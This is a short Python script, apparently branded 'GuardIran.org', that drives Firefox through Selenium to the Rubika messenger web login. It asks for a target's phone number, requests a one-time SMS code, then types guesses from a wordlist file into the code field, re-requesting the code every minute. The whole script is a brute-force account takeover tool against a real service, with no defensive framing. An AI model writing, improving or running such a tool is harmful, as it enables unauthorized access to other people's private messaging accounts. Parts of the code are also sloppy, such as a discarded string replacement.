
from selenium import webdriver as wb
import time,platform,os
from pyfiglet import figlet_format as font
def Rubika():
    REQUIREMENTS=os.system('pip install -r requirements.txt')
    print(REQUIREMENTS)
    time.sleep(3)
    def CLEAR():
        Clear_Cls=print(font('GuardIran.org'))
    os_INFO=platform.uname()
    if 'Windows' in os_INFO:
        os.system('cls')
        CLEAR()
    else:
        pass
    print(' [+]  for example 9129871234 ...\n')
    Number_CellPhone = input(' [~] please Enter The number cellphone : > ')
    if ' ' in Number_CellPhone:
        Number_CellPhone.replace(' ','')
    drive=wb.Firefox()
    drive.get('https://web.rubika.ir/#/login')
    drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[2]/div[2]/input').send_keys(Number_CellPhone)
    drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[1]/div/a').click()
    time.sleep(.3)
    drive.find_element_by_xpath('/html/body/div/app-root/app-modal-container/div/app-modal-view/div/div/div/app-confirm-custom/div/div[2]/button[2]/span').click()
    time.sleep(2)
    stop=time.time()+61
    with open('./pass.txt','r') as passlist:
        for i in passlist.read().split():
            if stop<=time.time():
                stop=time.time()+60
                drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[3]/p/a/span').click()
                time.sleep(.1)
                print('\n\n         >>>>>>   UPDATE   TIME  <<<<<<\n\n')

            print(f'\n\n\n                      TEST CODE {i} ON  +98{Number_CellPhone}')
            drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[4]/input').send_keys(str(i))
            time.sleep(.001)
            drive.find_element_by_xpath('/html/body/div/app-root/tab-login/div/div[2]/div[2]/form/div[4]/input').clear()
Rubika()
